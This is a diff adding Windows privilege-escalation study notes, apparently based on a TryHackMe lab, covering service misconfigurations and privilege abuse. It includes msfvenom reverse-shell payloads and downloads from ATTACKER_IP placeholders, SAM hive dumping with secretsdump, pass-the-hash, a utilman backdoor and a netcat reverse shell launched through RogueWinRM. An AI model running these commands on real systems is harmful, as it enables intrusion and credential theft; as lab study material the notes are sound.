@@ -92,7 +92,213 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 Just as PuTTY stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.\
 
 
-\
+### Other Easy Access
 
+Privilege escalation is not always a challenge. Some misconfiguations can allow to obtain high privileged user, and even administrator access.
 
-\
+#### Scheduled Tasks
+
+Scheduled tasks can be listed from the command line using the `schtasks` command without any options. Sometimes a scheduled task lost its binary or is using a binary that can be modified.
+
+* "Task to Run" parameter indicates what gets executed by the scheduled task and "Run as User" parameter, shows the user that will be used to execute the task.
+* If the current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the user, resulting in a simple privilege escalation. To check the file permissions on the executable, use `icacls`
+* Can modify the .bat file and insert any payload to spawn a reverse shell.
+
+#### AlwaysInstallElevated
+
+Windows installer files (also known as .msi files) are used to install applications on the system. They run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account. This could potentially allow to generate a malicious MSI file that would run with admin privileges.
+
+Requires two registry values to be set:
+
+<pre class="language-shell"><code class="lang-shell"><strong>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+</strong>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></pre>
+
+If these are set, generate a malicious .msi file using `msfvenom`, as seen below:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+
+## Abusing Service Misconfigurations
+
+Windows services are managed by the **Service Control Manager (SCM)**. The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
+
+Each service on a Windows machine will have an executable which will be run by the SCM when a service is started. The service executable implement special functions to be able to communicate with the SCM, and not any executable can be started as a service successfully.
+
+Use the `sc qc` command to a view service configuration.
+
+* **BINARY\_PATH\_NAME** parameter shows the associated executable.
+* **SERVICE\_START\_NAME** displays the account used to run the service.
+
+Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
+
+All the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`
+
+A sub-key exists for every service in the system. There is **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a sub-key called **Security**.
+
+### Insecure Permissions on Service Executable
+
+If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account. Use `sc` to query the service configuration.
+
+* Check the permissions of the service executable with `icacls EXECUTABLE`. The Everyone group has modify permissions (M) on the service's executable.
+* Overwrite the executable with any payload of preference, and the service will execute it with the privileges of the configured user account.
+* Generate an exe-service payload using msfvenom and serve through a python web-server.
+  * `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
+  * Utilize powershell to download the payload: `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
+  *   Once the payload is on the Windows server:&#x20;
+
+      ```powershell
+      C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+      C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+              1 file(s) moved.
+
+      C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+              1 file(s) moved.
+
+      C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+              Successfully processed 1 files.
+      ```
+* Grant full permissions to the new service executable payload and start a reverse listener shell on attacker machine.
+
+### Unquoted Service Paths
+
+When we can not directly write into service executables, there might be a chance to force a service into running arbitrary executables by using an obscure feature.
+
+When working with Windows services, a particular behavior occurs when the service is configured to point to an "unquoted" executable.
+
+* Unquoted means the path of the associated executable is not properly quoted to account for spaces on the command.
+*   Proper quotation for path name:&#x20;
+
+    ```shell-session
+    BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
+    ```
+*   Without proper quotation:
+
+    ```shell-session
+    BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+    ```
+
+Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM does not know which of the following trying to execute:
+
+| Command                                              | Argument 1                 | Argument 2                 |
+| ---------------------------------------------------- | -------------------------- | -------------------------- |
+| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
+| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
+| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
+
+Most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. Some exceptions are when installers change the permissions on the installed folders, making the services vulnerable.
+
+* In this case, the Disk Sorter binaries are under `C:\MyPrograms` and inherits the permissions of the `C:\` directory. Verify with `icacls` that the users group has AD and WD privileges allowing the user to create sub-directories and files.
+* Generate a payload reverse shell and send through python server similar to the previous task and overwrite Disk.exe
+
+### Insecure Service Permissions
+
+The service DACL (not the service's executable DACL) allow to modify the configuration of a service, and then reconfigure the service. This will allow to point to any executable need to run with any account, including SYSTEM.
+
+To check for a service DACL from the command line, use [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.
+
+* The BUILTIN\\\Users group has the `SERVICE_ALL_ACCESS` permission, meaning any user can reconfigure the service.
+* Create another reverse shell executable payload to the target machine and grant permissions to Everyone.
+*   To change the service's associated executable and account:
+
+    ```shell-session
+    sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
+    ```
+
+    * LocalSystem is the highest privileged account available.
+
+## Abusing Dangerous Privileges
+
+Privileges are rights than an account has to perform specific system-related tasks. Each user has a set of assigned privileges that can be checked with the following command: `whoami /priv`
+
+A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's view, only those privileges that allow to escalate in the system are of interest. A list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) GitHub project. Here are most common privileges to abuse:
+
+### SeBackup / SeRestore
+
+The SeBackup and SeRestore privileges allow users to read and write to any file in the sytem, ignoring any DACL in place.
+
+* `whoami /priv` to check privileges for the user.
+* Backup the SAM and SYSTEM hashes with `reg save hklm\system C:\Users\THMBackup\systemhive` and `reg save hklm\sam C:\Users\THMBackup\sam.hive`
+  * This will create files with the registry hives content to copy files to our attacker machine using SMB or any other available method. For SMB, use smbserver.py to start a simple SMB server with a network share in the current directory.
+* ```bash
+  mkdir share
+  python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+  ```
+  * This will create a share named _public_ pointing to the share directory, which requires the username and password of our current windows session, then copy command to transfer files.
+*   Use the impacket to retrieve the users' password hashes:&#x20;
+
+    ```bash
+    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+    ```
+* Finally use the Administrator's hash to perform Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges. `python3.9 /opt/impacket/examples/psexec.py -hashes`
+
+### SeTakeOwnership
+
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening possibilities to elevate privileges. For example, it is possible to search for a service running as SYSTEM and take ownership of the service's executable.
+
+To gain SeTakeOwner, open the command prompt using "Open as adminstrator" and input password to get an elevated console.
+
+* Check privileges with the command `whoami /priv`
+* We will use utilman, which is a built-in Windows application used to provide Ease of Access options during the lock screen.
+  * Utilman is run with SYSTEM privileges and will replace the original binary for any payload.
+
+To replace utilman, start by taking ownership with the following command:&#x20;
+
+```shell-session
+takeown /f C:\Windows\System32\Utilman.exe
+```
+
+Being the owner of a file does not necessarily mean having privileges over it, but allows the owner to assign any privileges for full permissions.
+
+```shell-session
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+```
+
+Replace `utilman.exe` with a copy of cmd.exe
+
+```shell-session
+copy cmd.exe utilman.exe
+```
+
+To trigger utilman, lock screen from the start button and click on the "Ease of Access" button, which runs with SYSTEM privileges.
+
+### SeImpersonate / SeAssignPrimaryToken
+
+These privileges allow a process to impersonate other users and act on their behalf. Impersonation consists of being able to spawn a process or thread under the security context of another user.
+
+Assume FTP service is running with user _ftp._ If user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/006115497113a0a4f03008028dc32fb7.png" alt=""><figcaption></figcaption></figure>
+
+In the image above, the FTP service would be able to access Ann's files since the ftp user has impersonation privileges, but not Bill's files, as the DACL in Bill's files does not allow user _ftp_. For the operating, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorization to the operating system; therefore the FTP service must implement it. If the FTP service were compromised, the attacker would immediately gain access to all of the folders to which the _ftp_ user has access.
+
+If the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, in simple terms, the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf.
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c25de66ae7777169d09a61ce2fb38e28.png" alt=""><figcaption></figcaption></figure>
+
+If user Ann logs in to the FTP service and given the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files.
+
+* Files do not need to provide access to the user _ftp_, and the operating system handles authorization. Since the FTP service is impersonating Ann, it will not be able to access Jude's or Bill's files during that session.
+
+As attackers, if managed to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, they can impersonate any user connecting and authenticating to that process.
+
+In Windows systems, the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. To elevate privileges, the attacker needs the following:
+
+1. Spawn a process that users can connect and authenticate to for impersonation to occur.
+2. Find a way to force privileged users to connect and authenticate to the spawn malicious process.
+
+In this example, use RogueWinRM exploit to accomplish both conditions. To use RogueWinRM, first upload the exploit to the target machine.
+
+* The RogueWinRM exploit is possible because when a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is normally used for WinRM service, that exposes a Powershell console to be used remotely through the network - like SSH, but using Powershell.
+* Before running the exploit, start a netcat listener to receive a reverse shell on the attacker's machine.
+  *   To exploit, trigger RogueWinRM with the web shell using the command:
+
+      ```shell-session
+      c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+      ```
+
+The exploit may take up to 2 minutes to work so the browser may seem unresponsive.&#x20;
+
+* The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case.
+* `-a` parameter is used to pass arguments to the executable. To establish a reverse shell, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442` &#x20;
